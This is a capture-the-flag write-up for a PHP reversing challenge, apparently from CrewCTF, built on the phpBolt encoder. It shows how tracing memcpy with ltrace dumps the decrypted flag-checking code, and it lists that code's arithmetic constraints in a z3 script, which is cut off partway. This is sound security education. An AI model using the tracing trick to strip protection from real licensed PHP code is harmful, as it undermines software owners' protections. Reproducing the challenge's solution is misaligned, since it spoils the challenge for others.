# ezbolt (Rev)

	phpBolt - Best php encoder:
    Encrypt and decrypt php source code.
    Ensure only licensed people are using.
    Free for small and medium companies.
    Encode and run PHP files.
    Ioncube alternative (free)
    Waste of time (free)


Ezbolt was a reversing challenge from CrewCTF, among 700+ teams, only ~20 teams solved it. The challenge had something todo with phpBolt which is an open source encoding project that can be found [here](https://github.com/arshidkv12/phpBolt). Authors provided the following file:
```php
<?php bolt_decrypt( __FILE__ , 'The_Longer_The_Key_The_Better_The_Encryption_Right?'); return 0;
    ##!!!##GRj6FhlKQkrkAv5AFztMTDtTOUc7SgIBSUw+AQZNTkw5TUpGQ04CTD87PkZDSD8C/CBGO0EU+vwDAwMDAAA9SU9ITgL+QAMXFw0TAAD+QDUMEDcF/kA1CxI3B/5ANQ0RNwT+QDUTNxcXBwwSDg4AAP5ANQ0QNzj+QDULDTcH/kA1DBE3FxcOEAAA/kA1Cw43OP5ANQsPNwT+QDUNDDc4/kA1DQ83B/5ANQwLNxcXCwsLEw4AAP5ANRM3OP5ANQsLNwT+QDULDjcH/kA1Cwo3OP5ANQ0LNxcXDxILCwAA/kA1Cwo3B/5ANQwRNwX+QDUMEjc4/kA1DQ83Bf5ANQ0RNxcXCxMAAP5ANQwTNwX+QDUMDTcE/kA1DAs3FxcLCg8ODwAA/kA1DBI3Bf5ANQo3BP5ANQwONxcXExMLDwAA/kA1DBM3B/5ANQwQNwT+QDUNNxcXBwsLEgoPAAD+QDUMDjcF/kA1DBM3B/5ANQ43BP5ANQ0PNwX+QDUNDDcXFwcLDg8TDAAA/kA1CxA3B/5ANQwPNzj+QDUMDDcE/kA1DBE3FxcMDxENAAD+QDULEzc4/kA1Cws3BP5ANQsQNxcXExIOEgAA/kA1CxM3OP5ANQwSNwf+QDUNEjcF/kA1DBE3OP5ANQ03FxcPDwAA/kA1DjcH/kA1DDcF/kA1DA83FxcRCgAA/kA1DAs3BP5ANQsNNwf+QDULDjcE/kA1DTcXFwwKCwAA/kA1CxM3Bf5ANQsONwf+QDULCzcE/kA1DRA3Bf5ANQwLNxcXBw0PERIAAP5ANQwQNzj+QDUNDTcE/kA1EjcXFxELCgoAAP5ANQ0QNwT+QDURNwf+QDUMCzcXFw0QCgsAAP5ANQsQNwf+QDULNzj+QDUNDTcXFwcLCw4AAP5ANQ0RNzj+QDUSNwf+QDUMCzcF/kA1CxA3FxcSAAD+QDUNDjc4/kA1DA83BP5ANQsSNwX+QDUMCzcXFw0TDwoAAP5ANQwRNwf+QDUMEjc4/kA1EDcE/kA1CzcXFwcLCxISEQAA/kA1DBE3Bf5ANQ0LNwf+QDUPNwX+QDUMCzcXFxIPAAD+QDULEjc4/kA1DBM3BP5ANQsQNwX+QDUKNwT+QDUPNxcXCxITEhIAAP5ANQsONwf+QDUNCjcF/kA1DBM3FxcNDAAA/kA1DBE3B/5ANQ0RNzj+QDUTNwX+QDUKNwT+QDUMCjcXFwcRExIKAAD+QDUMEjcE/kA1DQ03OP5ANQwPNwf+QDUMNwX+QDUQNxcXCwwNDQsAAP5ANQwONzj+QDUMDTcE/kA1EDcF/kA1DRE3BP5ANQwMNxcXCw4QEhAAAP5ANQsLNwT+QDUNCzc4/kA1DA83B/
snipp..
```
To be able to execute the file, some modifications were needed to the php.ini file, I won't get into that in this writeup. Once that part is done, we can execute the file:
```
$ php chall.php
 Flag: test
 Nope
```
This means that we need to pass an input that the script accetps, which is obviously the flag in this case. I had some thoughts on running **ltrace** to trace some library calls. 
```
$ ltrace -s 100 php chall.php
 ...snip...
 GARBAGE
 ...snip...
```
This returnted with an overwhelming output, so I needed to try smartet, so I chose to force ltrace on checking for specific libraries. This can be done by adding the **-e** flag.
Becasue I had no intrest in other library calls, I tried **memcpy**, I have also increased **STRSIZE**, just in case. 
```
$ ltrace -e memcpy -s 1000000 php chall.php
```
Running the above command returned with garbage, but this time I tried to analyse the response and this is what I found:

```php
->memcpy(0x7fb350886018, <?php\n($f=array_map('ord',str_split(readline("Flag: "))))&&count($f)==39&&$f[26]+$f[18]-$f[37]*$f[9]==-2844&&$f[36]^$f[13]-$f[27]==46&&$f[14]^$f[15]*$f[32]^$f[35]-$f[21]==11194&&$f[9]^$f[11]*$f[14]-$f[10]^$f[31]==5811&&$f[10]-$f[27]+$f[28]^$f[35]+$f[37]==19&&$f[29]+$f[23]*$f[21]==10545&&$f[28]+$f[0]*$f[24]==9915&&$f[29]-$f[26]*$f[3]==-11805&&$f[24]+$f[29]-$f[4]*$f[35]+$f[32]==-14592&&$f[16]-$f[25]^$f[22]*$f[27]==2573&&$f[19]^$f[11]*$f[16]==9848&&$f[19]^$f[28]-$f[38]+$f[27]^$f[3]==55&&$f[4]-$f[2]+$f[25]==70&&$f[21]*$f[13]-$f[14]*$f[3]==201&&$f[19]+$f[14]-$f[11]*$f[36]+$f[21]==-3578&&$f[26]^$f[33]*$f[8]==7100&&$f[36]*$f[7]-$f[21]==3601&&$f[16]-$f[1]^$f[33]==-114&&$f[37]^$f[8]-$f[21]+$f[16]==8&&$f[34]^$f[25]*$f[18]+$f[21]==3950&&$f[27]-$f[28]^$f[6]*$f[1]==-11887&&$f[27]+$f[31]-$f[5]+$f[21]==85&&$f[18]^$f[29]*$f[16]+$f[0]*$f[5]==18988&&$f[14]-$f[30]+$f[29]==32&&$f[27]-$f[37]^$f[9]+$f[0]*$f[20]==-7980&&$f[28]*$f[33]^$f[25]-$f[2]+$f[6]==12331&&$f[24]^$f[23]*$f[6]+$f[37]*$f[22]==14686&&$f[11]*$f[31]^$f[25]-$f[16]*$f[22]==-1944&&$f[10]+$f[36]*$f[18]==2748&&$f[12]-$f[21]*$f[31]==-4750&&$f[22]+$f[26]^$f[13]==213&&$f[19]^$f[30]+$f[22]-$f[20]^$f[21]==98&&$f[12]+$f[37]*$f[34]==3182&&$f[0]*$f[12]-$f[26]+$f[5]^$f[16]==9373&&$f[37]-$f[13]^$f[38]==-128&&$f[14]+$f[19]*$f[10]+$f[28]-$f[21]==11302&&$f[20]^$f[14]*$f[1]==5862&&$f[17]+$f[15]^$f[9]==226&&$f[24]-$f[30]^$f[29]==-82&&$f[36]+$f[25]^$f[12]==14&&$f[4]*$f[13]-$f[5]==8006&&$f[14]*$f[10]-$f[28]==5394&&$f[15]+$f[28]*$f[1]^$f[20]==13159&&$f[37]+$f[38]^$f[12]==227&&$f[32]+$f[23]-$f[22]*$f[1]+$f[20]==-5527&&$f[20]-$f[27]^$f[29]*$f[3]-$f[7]==11172&&$f[32]*$f[31]-$f[9]*$f[24]==195&&$f[25]*$f[26]^$f[9]-$f[19]==-4856&&$f[18]+$f[2]*$f[0]-$f[16]^$f[37]==10036&&$f[0]^$f[35]*$f[30]==13697&&$f[26]+$f[9]^$f[14]+$f[7]^$f[4]==76&&$f[34]+$f[18]*$f[38]-$f[32]==9952&&$f[7]-$f[0]+$f[36]-$f[11]==-70&&$f[31]*$f[37]+$f[29]==3308&&$f[25]^$f[21]*$f[38]==11859&&$f[26]^$f[10]+$f[5]==184&&$f[16]-$f[10]*$f[25]==-5100&&$f[36]^$f[13]+$f[1]*$f[23]==12575&&$f[17]^$f[29]-$f[8]+$f[18]==50&&$f[3]-$f[32]*$f[23]==-10551&&$f[10]^$f[31]+$f[4]^$f[11]-$f[27]==131&&$f[35]-$f[18]*$f[9]+$f[15]-$f[8]==-3670&&$f[0]^$f[28]*$f[7]+$f[19]==12843&&$f[15]^$f[11]+$f[35]==158&&$f[38]-$f[25]^$f[37]==114&&$f[3]+$f[22]*$f[25]-$f[15]+$f[27]==2503&&$f[17]^$f[11]-$f[16]+$f[19]*$f[8]==6831&&$f[38]*$f[11]^$f[33]-$f[8]==14478&&$f[9]*$f[12]^$f[2]==4533&&$f[9]*$f[6]^$f[16]==5076&&$f[23]-$f[22]^$f[14]+$f[10]*$f[17]==10364&&$f[28]+$f[21]*$f[18]==7714&&$f[0]+$f[18]-$f[5]^$f[3]-$f[9]==4&&$f[20]+$f[21]*$f[31]==4925&&$f[19]-$f[34]*$f[17]-$f[32]^$f[37]==-4633&&$f[36]^$f[34]*$f[16]^$f[33]*$f[22]==1457&&$f[34]-$f[32]*$f[24]^$f[37]==-9583&&$f[0]+$f[9]*$f[17]-$f[2]==4558&&$f[35]+$f[26]-$f[13]+$f[34]^$f[10]==160&&$f[6]+$f[22]-$f[8]^$f[3]==46&&$f[10]*$f[12]+$f[28]==10374&&$f[15]-$f[16]^$f[24]==124&&$f[5]^$f[23]+$f[10]-$f[14]*$f[9]==-2246&&$f[13]^$f[6]+$f[25]*$f[19]-$f[27]==5111&&$f[27]*$f[26]^$f[13]-$f[37]*$f[30]==-2088&&$f[29]-$f[20]*$f[23]^$f[31]==-8756&&$f[38]*$f[7]^$f[6]*$f[4]==1864&&$f[1]*$f[13]^$f[20]+$f[3]==7587&&$f[11]^$f[6]*$f[31]^$f[2]*$f[29]==12727&&$f[26]^$f[5]+$f[31]-$f[32]==38&&$f[37]*$f[2]+$f[3]-$f[14]==6431&&$f[24]^$f[1]*$f[36]+$f[29]==3954&&$f[26]*$f[14]-$f[2]==4999&&$f[27]*$f[18]-$f[32]==3983&&$f[6]*$f[23]+$f[29]*$f[18]+$f[10]==19148&&$f[34]+$f[13]^$f[0]==16&&$f[22]+$f[21]-$f[2]==45&&$f[10]^$f[3]-$f[9]+$f[8]==229&&$f[7]-$f[31]*$f[1]==-5702&&$f[1]^$f[14]*$f[27]-$f[21]==2488&&$f[31]+$f[24]^$f[0]==245&&$f[8]-$f[27]+$f[11]-$f[33]==23&&$f[23]*$f[32]+$f[8]^$f[3]==10631&&$f[6]+$f[25]-$f[22]==101&&$f[23]+$f[36]^$f[38]+$f[16]^$f[26]==58&&$f[10]*$f[8]+$f[26]==7228&&$f[0]+$f[2]-$f[21]==105&&$f[16]*$f[6]+$f[35]^$f[12]+$f[33]==8786&&$f[20]*$f[9]+$f[11]==3956&&$f[8]^$f[31]-$f[2]*$f[13]==-6549&&$f[35]*$f[12]+$f[19]==11599&&$f[35]-$f[38]^$f[15]+$f[36]==-152&&$f[3]*$f[8]-$f[19]==7750&&$f[37]+$f[12]-$f[27]+$f[22]^$f[19]==246&&$f[26]^$f[0]+$f[13]*$f[10]-$f[7]==7087&&$f[0]+$f[28]*$f[18]==9219&&$f[3]-$f[32]*$f[34]==-4634&&$f[19]^$f[7]-$f[14]*$f[21]==-4629&&$f[35]-$f[3]*$f[9]-$f[36]==-5624&&$f[16]*$f[11]-$f[4]*$f[34]==3717&&$f[27]*$f[33]+$f[14]==5559&&$f[30]+$f[15]^$f[6]==141&&$f[10]*$f[30]-$f[28]+$f[12]==12293&&$f[22]+$f[10]*$f[8]^$f[20]==7259&&$f[13]-$f[26]+$f[0]==65&&$f[10]^$f[31]-$f[32]==-66&&$f[26]-$f[27]^$f[12]*$f[6]==9897&&$f[17]+$f[20]^$f[31]*$f[33]==5419&&$f[26]-$f[38]*$f[27]^$f[36]+$f[17]==-6147&&$f[14]*$f[9]+$f[18]^$f[17]*$f[32]==10783&&$f[34]^$f[23]+$f[22]==144&&$f[37]*$f[7]-$f[38]+$f[14]==6982&&$f[19]^$f[15]-$f[27]==40&&$f[8]^$f[12]+$f[37]-$f[22]==41&&$f[36]*$f[2]^$f[16]==3409&&$f[19]*$f[25]+$f[1]*$f[26]==16392&&$f[35]^$f[33]-$f[5]==-123&&$f[16]*$f[28]+$f[17]^$f[11]+$f[20]==9475&&$f[34]+$f[9]*$f[29]+$f[26]-$f[0]==4610&&$f[37]-$f[2]*$f[20]+$f[38]-$f[32]==-7989&&$f[31]-$f[18]*$f[10]==-8589&&$f[15]-$f[32]+$f[14]^$f[8]-$f[10]==-109&&$f[5]^$f[37]-$f[3]+$f[33]==68&&$f[21]*$f[10]^$f[20]+$f[11]^$f[30]==10402&&$f[30]-$f[36]^$f[16]==5&&$f[33]+$f[5]*$f[11]==13100&&$f[19]-$f[11]*$f[15]==-13236&&$f[25]-$f[18]^$f[1]+$f[26]==-202&&$f[25]*$f[7]^$f[32]+$f[15]^$f[4]==5551&&$f[10]+$f[28]^$f[33]-$f[23]==-224&&$f[0]*$f[21]+$f[16]*$f[32]^$f[1]==17635&&$f[26]-$f[27]^$f[29]*$f[24]==9356&&$f[17]^$f[32]+$f[14]*$f[27]==2773&&$f[10]-$f[30]^$f[22]==-55&&$f[13]+$f[16]*$f[34]==4182&&$f[21]-$f[36]*$f[0]-$f[2]==-3273&&$f[33]+$f[8]*$f[12]-$f[10]==6270&&$f[22]+$f[27]*$f[15]-$f[31]==5865&&$f[23]^$f[29]-$f[4]*$f[3]==-14500&&$f[3]^$f[30]*$f[18]^$f[12]==9096&&$f[8]^$f[23]+$f[4]==171&&$f[32]^$f[30]*$f[8]-$f[25]+$f[10]==7617&&$f[16]-$f[38]^$f[2]==-78&&$f[3]^$f[25]*$f[5]+$f[10]==5403&&$f[14]*$f[16]+$f[0]==4383&&$f[20]*$f[4]-$f[31]==9789&&$f[26]+$f[0]^$f[11]*$f[8]==7471&&$f[9]+$f[3]*$f[26]==11948&&$f[21]+$f[13]*$f[26]+$f[8]*$f[5]==14087&&$f[11]^$f[16]+$f[20]-$f[3]+$f[24]==228&&$f[15]-$f[4]^$f[27]*$f[35]-$f[33]==-6057&&$f[9]-$f[29]*$f[5]==-10592&&$f[33]-$f[3]*$f[7]==-13220&&$f[5]+$f[26]-$f[27]==161&&$f[5]-$f[37]^$f[1]-$f[24]+$f[25]==14&&$f[35]^$f[38]*$f[36]==4196&&$f[3]-$f[22]+$f[10]*$f[16]+$f[34]==9189&&$f[26]*$f[25]-$f[35]+$f[33]-$f[31]==4736&&$f[25]-$f[37]+$f[9]-$f[35]*$f[23]==-13277&&$f[35]+$f[19]^$f[7]+$f[26]==53&&$f[29]-$f[19]^$f[26]*$f[25]+$f[23]==-4903&&$f[37]*$f[2]^$f[36]==6394&&$f[26]-$f[12]*$f[21]==-8925&&$f[17]+$f[18]*$f[3]^$f[13]+$f[23]==9535&&$f[17]+$f[12]-$f[1]*$f[28]^$f[7]==-12918&&$f[0]^$f[21]*$f[28]-$f[11]+$f[29]==10842&&$f[1]+$f[25]^$f[27]+$f[21]==48&&$f[0]+$f[36]*$f[21]==3234&&$f[6]*$f[13]-$f[24]*$f[20]-$f[28]==-1170&&$f[9]^$f[37]+$f[2]-$f[5]^$f[21]==91&&$f[8]-$f[10]+$f[6]*$f[16]-$f[7]==8582&&$f[25]*$f[14]+$f[28]^$f[27]==2609&&$f[27]*$f[28]^$f[38]==5835&&$f[10]^$f[5]+$f[36]^$f[37]+$f[22]==143&&$f[29]-$f[10]*$f[37]^$f[4]+$f[36]==-6825&&$f[6]^$f[31]+$f[1]-$f[0]==42&&$f[17]+$f[28]*$f[21]+$f[11]^$f[24]==11074&&$f[24]+$f[10]*$f[8]==7227&&$f[20]*$f[35]+$f[4]^$f[13]+$f[37]==9930&&$f[23]^$f[5]*$f[28]^$f[25]==12734&&$f[13]+$f[29]*$f[0]^$f[33]==9363&&$f[19]+$f[26]^$f[35]+$f[20]^$f[5]==117&&$f[19]-$f[26]*$f[35]-$f[16]==-12080&&$f[31]+$f[37]-$f[3]+$f[25]^$f[13]==105&&$f[16]^$f[24]*$f[31]^$f[32]==5004&&$f[33]-$f[35]+$f[14]==38&&$f[18]^$f[29]-$f[36]==110&&$f[35]^$f[15]*$f[16]-$f[32]^$f[17]==9597&&$f[24]^$f[38]-$f[22]*$f[4]==-6241&&$f[30]+$f[31]-$f[36]==132&&$f[11]^$f[4]-$f[3]+$f[26]*$f[13]==6584&&$f[7]-$f[30]+$f[37]*$f[27]-$f[4]==3088&&$f[37]+$f[3]-$f[30]==68&&$f[23]+$f[10]-$f[20]+$f[15]-$f[7]==141&&$f[12]-$f[3]*$f[31]+$f[5]*$f[29]==4666&&$f[37]*$f[16]+$f[3]*$f[7]==18620&&$f[38]+$f[7]-$f[17]+$f[13]==208&&$f[38]*$f[11]-$f[26]^$f[32]+$f[36]==14530&&$f[29]+$f[9]-$f[7]==31&&$f[30]+$f[3]*$f[31]^$f[38]*$f[34]==4042&&$f[3]-$f[8]^$f[9]-$f[21]+$f[4]==121&&$f[31]^$f[3]+$f[14]^$f[16]-$f[20]==157&&$f[2]-$f[9]*$f[37]==-2923&&$f[1]-$f[37]^$f[8]*$f[10]-$f[23]==7001&&$f[19]-$f[31]^$f[10]*$f[32]^$f[36]==10488&&$f[0]^$f[38]+$f[24]-$f[30]+$f[23]==191&&$f[9]-$f[29]^$f[0]-$f[2]^$f[5]==95&&$f[33]-$f[23]+$f[35]==119&&$f[2]^$f[5]+$f[25]*$f[13]==3253&&$f[7]*$f[30]^$f[28]-$f[14]==12767&&$f[7]^$f[15]*$f[38]==14423&&$f[26]+$f[9]^$f[25]*$f[29]-$f[22]==4361&&$f[31]*$f[25]-$f[38]==2323&&$f[31]^$f[35]*$f[1]-$f[38]+$f[6]==13822&&$f[33]+$f[35]-$f[29]+$f[4]^$f[6]==361&&$f[26]-$f[33]^$f[6]+$f[11]-$f[7]==-108&&$f[17]-$f[0]^$f[33]-$f[10]==-4&&$f[26]+$f[14]^$f[35]*$f[32]==11598&&$f[24]^$f[1]+$f[26]-$f[23]==11&&$f[38]+$f[28]-$f[25]^$f[4]==196&&$f[4]*$f[0]^$f[3]+$f[2]==12109&&$f[29]*$f[33]^$f[10]*$f[8]==13260&&$f[24]^$f[37]+$f[8]-$f[18]==82&&$f[8]*$f[27]^$f[38]==3419&&$f[26]*$f[4]^$f[38]==12401&&$f[22]+$f[19]^$f[13]-$f[12]==-136&&$f[15]^$f[5]-$f[28]+$f[34]*$f[35]==5972&&$f[13]+$f[37]-$f[20]*$f[16]+$f[27]==-6540&&$f[6]-$f[28]^$f[38]*$f[29]==-11883&&$f[35]-$f[1]*$f[11]^$f[34]==-13088&&$f[34]*$f[14]-$f[25]==2451&&$f[19]-$f[24]+$f[38]^$f[6]==234&&$f[32]-$f[31]+$f[35]^$f[37]==152&&$f[33]^$f[23]-$f[15]*$f[29]-$f[34]==-10756&&$f[7]-$f[16]^$f[6]*$f[17]^$f[31]==9911&&$f[19]-$f[5]+$f[32]==89&&$f[20]-$f[27]+$f[18]*$f[31]^$f[37]==4146&&$f[9]-$f[4]^$f[37]-$f[28]==120&&$f[0]*$f[11]-$f[37]*$f[9]+$f[23]==8570&&$f[36]*$f[30]+$f[0]^$f[4]==3950&&$f[28]*$f[24]-$f[35]^$f[32]==11260&&$f[33]+$f[25]^$f[36]-$f[1]==-205&&$f[35]-$f[7]^$f[30]==123&&$f[24]*$f[29]^$f[16]+$f[10]==9341&&$f[32]*$f[3]-$f[24]==11444&&$f[27]*$f[31]^$f[2]==2636&&$f[1]*$f[38]-$f[15]*$f[14]==8385&&$f[28]+$f[1]*$f[25]-$f[11]*$f[0]==-5898&&$f[30]+$f[13]^$f[35]==205&&$f[27]-$f[21]^$f[25]+$f[28]==-138&&$f[27]*$f[3]^$f[24]+$f[2]^$f[6]==5909&&$f[1]*$f[10]^$f[23]==12406&&$f[15]^$f[34]-$f[12]*$f[23]+$f[29]==-10291&&$f[36]-$f[31]+$f[6]==86&&$f[20]^$f[28]-$f[17]*$f[34]^$f[14]==-4576&&$f[12]*$f[30]^$f[23]+$f[2]==10909&&$f[4]*$f[7]^$f[0]==13747&&$f[15]^$f[25]*$f[22]==2531&&$f[13]-$f[24]^$f[34]==-18&&$f[17]^$f[18]-$f[31]==66&&$f[6]^$f[23]*$f[32]+$f[30]-$f[24]==10709&&$f[0]+$f[4]*$f[25]-$f[24]^$f[7]==5984&&$f[21]+$f[38]*$f[24]^$f[20]==12518&&$f[16]+$f[20]*$f[6]-$f[2]==8303&&$f[21]^$f[24]*$f[30]-$f[16]==11165&&$f[28]*$f[13]+$f[15]==7639&&$f[1]*$f[28]-$f[11]^$f[3]==12839&&$f[28]-$f[11]*$f[19]+$f[35]*$f[29]==-455&&$f[29]+$f[24]*$f[23]-$f[3]==10866&&$f[25]-$f[5]^$f[29]==-97&&$f[19]+$f[9]*$f[24]-$f[17]==4761&&$f[12]+$f[5]*$f[1]^$f[27]-$f[20]==-12836&&$f[30]^$f[32]*$f[38]-$f[16]^$f[28]==12041&&$f[19]-$f[13]^$f[35]-$f[0]+$f[38]==181&&$f[34]^$f[13]+$f[29]==144&&$f[9]^$f[8]-$f[22]+$f[29]==94&&$f[13]+$f[2]-$f[4]==44&&$f[4]-$f[7]^$f[14]+$f[38]*$f[3]==14917&&$f[35]*$f[33]^$f[29]-$f[18]==13059&&$f[14]^$f[0]-$f[25]^$f[27]-$f[35]==-70&&$f[6]*$f[31]-$f[21]==5209&&$f[12]^$f[13]+$f[4]*$f[0]+$f[27]==12377&&$f[0]+$f[9]*$f[17]-$f[35]+$f[33]==4646&&$f[15]+$f[11]^$f[22]+$f[31]^$f[0]==226&&$f[25]-$f[7]^$f[35]==-71&&$f[2]^$f[31]+$f[11]-$f[6]^$f[1]==40&&$f[23]^$f[38]-$f[19]==123&&$f[23]^$f[16]-$f[1]*$f[24]^$f[17]==-11249&&$f[6]-$f[36]+$f[11]^$f[16]==239&&$f[5]-$f[4]*$f[20]^$f[32]==-9631&&$f[4]-$f[29]*$f[32]^$f[28]==-9202&&$f[30]-$f[14]^$f[24]-$f[18]==44&&$f[17]+$f[38]*$f[34]^$f[3]==6203&&$f[30]+$f[19]*$f[14]==5418&&$f[20]^$f[6]+$f[2]==157&&$f[24]^$f[13]-$f[14]==108&&$f[36]-$f[30]+$f[38]==44&&$f[38]+$f[20]^$f[2]+$f[17]*$f[34]==4697&&$f[34]^$f[28]-$f[23]*$f[35]+$f[19]==-13075&&$f[17]^$f[19]+$f[15]==132&&$f[18]+$f[14]*$f[20]==4160&&$f[12]-$f[8]*$f[5]==-7297&&$f[21]-$f[14]*$f[23]==-5515&&$f[34]*$f[22]+$f[32]-$f[12]==2501&&$f[12]+$f[8]*$f[30]+$f[23]*$f[21]==18069&&$f[9]*$f[4]+$f[7]^$f[20]+$f[14]==5891&&$f[14]*$f[7]-$f[32]+$f[4]==5738&&$f[2]-$f[36]*$f[18]^$f[19]==-2435&&$f[7]*$f[34]+$f[11]==5604&&$f[33]*$f[27]+$f[17]==5603&&$f[18]+$f[14]^$f[36]-$f[17]==-191&&$f[4]-$f[36]+$f[22]*$f[1]+$f[9]==5952&&$f[4]^$f[38]-$f[34]+$f[28]*$f[5]==12887&&$f[8]-$f[33]*$f[19]+$f[30]-$f[12]==-11147&&$f[19]+$f[36]^$f[6]*$f[9]==4873&&$f[22]*$f[5]^$f[32]*$f[20]-$f[12]==2977&&$f[13]-$f[11]*$f[24]+$f[5]==-11306&&$f[23]*$f[11]+$f[34]^$f[12]==12886&&$f[34]-$f[18]+$f[15]*$f[23]-$f[9]==12571&&$f[15]-$f[2]*$f[11]-$f[7]==-11713&&$f[6]+$f[24]*$f[5]^$f[13]*$f[32]==12986&&$f[30]*$f[11]^$f[22]-$f[33]+$f[8]==13217&&$f[32]+$f[22]*$f[13]-$f[11]+$f[33]==3455&&$f[30]-$f[17]+$f[33]-$f[22]==76&&$f[15]+$f[21]^$f[34]*$f[32]==4675&&$f[12]-$f[23]*$f[11]==-12665&&$f[34]-$f[7]*$f[20]+$f[9]*$f[30]==-3439&&$f[20]*$f[1]-$f[4]+$f[18]==9077&&$f[17]+$f[19]*$f[36]==3527&&$f[22]^$f[15]*$f[18]==9155&&$f[6]^$f[15]*$f[12]==10949&&$f[15]*$f[20]+$f[5]-$f[24]==9213&&$f[6]+$f[7]*$f[15]-$f[19]==12880&&$f[7]+$f[17]-$f[1]*$f[13]+$f[15]==-7202&&$f[13]-$f[17]+$f[12]^$f[22]==113&&$f[15]+$f[24]^$f[7]-$f[28]==-216&&$f[5]^$f[17]-$f[33]==-125&&$f[12]^$f[18]*$f[6]==8415&&$f[5]^$f[33]+$f[22]==239&&$f[4]^$f[8]-$f[2]*$f[30]+$f[5]==-11325&&$f[20]*$f[34]+$f[12]==4015&&$f[30]^$f[18]-$f[19]+$f[6]==34&&$f[30]*$f[8]+$f[9]*$f[17]==12084&&$f[30]-$f[20]*$f[19]^$f[6]==-8294&&$f[5]-$f[34]*$f[12]==-4543&&$f[22]-$f[2]^$f[21]-$f[7]==33&&$f[18]*$f[34]-$f[8]+$f[21]*$f[6]==13734&&$f[2]-$f[34]^$f[21]+$f[8]==149&&$f[6]-$f[36]*$f[12]==-3031&&$f[15]*$f[30]-$f[12]==13015&&$f[17]+$f[4]*$f[12]==11780&&$f[30]-$f[18]*$f[1]==-9006&&$f[36]*$f[12]-$f[1]==3021&&$f[15]^$f[18]-$f[1]^$f[5]*$f[8]==-7347&&$f[18]^$f[9]-$f[36]==95&&$f[18]+$f[22]*$f[4]^$f[36]==6384&&$f[33]^$f[15]+$f[7]-$f[34]+$f[8]==152&&$f[1]*$f[33]+$f[22]*$f[17]==17157&&$f[17]^$f[1]-$f[2]==82&&$f[17]^$f[33]-$f[18]==67&&$f[1]*$f[15]-$f[17]==13015&&$f[34]-$f[2]^$f[22]+$f[18]==-177&&$f[1]+$f[2]*$f[33]==11022&&$f[2]==101&&$f[2]==101&&die("Correct!\\n")||die("Nope\\n");\n?>
```
This looks like the original code, which means that we have successfully retrieved the code. However, the code is completley obfuscated, which I do believe this is why others struggled with it a bit. 

I took a smarter approach where I did some string replacements, some minor enhancements, and this was the result: 
```python
...snip...
flag[26]+flag[18]-flag[37]*flag[9]==-2844
flag[36]^flag[13]-flag[27]==46
flag[14]^flag[15]*flag[32]^flag[35]-flag[21]==11194
flag[9]^flag[11]*flag[14]-flag[10]^flag[31]==5811
flag[10]-flag[27]+flag[28]^flag[35]+flag[37]==19
flag[29]+flag[23]*flag[21]==10545
flag[28]+flag[0]*flag[24]==9915
flag[29]-flag[26]*flag[3]==-11805
flag[24]+flag[29]-flag[4]*flag[35]+flag[32]==-14592
flag[16]-flag[25]^flag[22]*flag[27]==2573
flag[19]^flag[11]*flag[16]==9848
flag[19]^flag[28]-flag[38]+flag[27]^flag[3]==55
flag[4]-flag[2]+flag[25]==70
flag[21]*flag[13]-flag[14]*flag[3]==201
flag[19]+flag[14]-flag[11]*flag[36]+flag[21]==-3578
...snip...
```

These looked like constrains, I simply used z3 to solve the challenge, I came up with the following script: 
```python
from z3_staff import * # https://github.com/KosBeg/z3_staff

flag = create_vars(39, size=8) # create and return 39 BitVecs with size 8
s = solver() # create and return solver
set_ranges() # set ASCII ranges(printable chars) for all vars created by create_vars

set_known_bytes('crew{*}', type='ff') # set known flag format, or we can use without ", type='ff'" like "set_known_bytes('crew{' + '*'* + '}')"

# add all known equations
add_eq(flag[26]+flag[18]-flag[37]*flag[9]==-2844)
add_eq(flag[36]^flag[13]-flag[27]==46)
add_eq(flag[14]^flag[15]*flag[32]^flag[35]-flag[21]==11194)
add_eq(flag[9]^flag[11]*flag[14]-flag[10]^flag[31]==5811)
add_eq(flag[10]-flag[27]+flag[28]^flag[35]+flag[37]==19)
add_eq(flag[29]+flag[23]*flag[21]==10545)
add_eq(flag[28]+flag[0]*flag[24]==9915)
add_eq(flag[29]-flag[26]*flag[3]==-11805)
add_eq(flag[24]+flag[29]-flag[4]*flag[35]+flag[32]==-14592)
add_eq(flag[16]-flag[25]^flag[22]*flag[27]==2573)
add_eq(flag[19]^flag[11]*flag[16]==9848)
add_eq(flag[19]^flag[28]-flag[38]+flag[27]^flag[3]==55)
add_eq(flag[4]-flag[2]+flag[25]==70)
add_eq(flag[21]*flag[13]-flag[14]*flag[3]==201)
add_eq(flag[19]+flag[14]-flag[11]*flag[36]+flag[21]==-3578)
add_eq(flag[26]^flag[33]*flag[8]==7100)
add_eq(flag[36]*flag[7]-flag[21]==3601)
add_eq(flag[16]-flag[1]^flag[33]==-114)
add_eq(flag[37]^flag[8]-flag[21]+flag[16]==8)
add_eq(flag[34]^flag[25]*flag[18]+flag[21]==3950)
add_eq(flag[27]-flag[28]^flag[6]*flag[1]==-11887)
add_eq(flag[27]+flag[31]-flag[5]+flag[21]==85)
add_eq(flag[18]^flag[29]*flag[16]+flag[0]*flag[5]==18988)
add_eq(flag[14]-flag[30]+flag[29]==32)
add_eq(flag[27]-flag[37]^flag[9]+flag[0]*flag[20]==-7980)
add_eq(flag[28]*flag[33]^flag[25]-flag[2]+flag[6]==12331)
add_eq(flag[24]^flag[23]*flag[6]+flag[37]*flag[22]==14686)
add_eq(flag[11]*flag[31]^flag[25]-flag[16]*flag[22]==-1944)
add_eq(flag[10]+flag[36]*flag[18]==2748)
add_eq(flag[12]-flag[21]*flag[31]==-4750)
add_eq(flag[22]+flag[26]^flag[13]==213)
add_eq(flag[19]^flag[30]+flag[22]-flag[20]^flag[21]==98)
add_eq(flag[12]+flag[37]*flag[34]==3182)
add_eq(flag[0]*flag[12]-flag[26]+flag[5]^flag[16]==9373)
add_eq(flag[37]-flag[13]^flag[38]==-128)
add_eq(flag[14]+flag[19]*flag[10]+flag[28]-flag[21]==11302)
add_eq(flag[20]^flag[14]*flag[1]==5862)
add_eq(flag[17]+flag[15]^flag[9]==226)
add_eq(flag[24]-flag[30]^flag[29]==-82)
add_eq(flag[36]+flag[25]^flag[12]==14)
add_eq(flag[4]*flag[13]-flag[5]==8006)
add_eq(flag[14]*flag[10]-flag[28]==5394)
add_eq(flag[15]+flag[28]*flag[1]^flag[20]==13159)
add_eq(flag[37]+flag[38]^flag[12]==227)
add_eq(flag[32]+flag[23]-flag[22]*flag[1]+flag[20]==-5527)
add_eq(flag[20]-flag[27]^flag[29]*flag[3]-flag[7]==11172)
add_eq(flag[32]*flag[31]-flag[9]*flag[24]==195)
add_eq(flag[25]*flag[26]^flag[9]-flag[19]==-4856)
add_eq(flag[18]+flag[2]*flag[0]-flag[16]^flag[37]==10036)
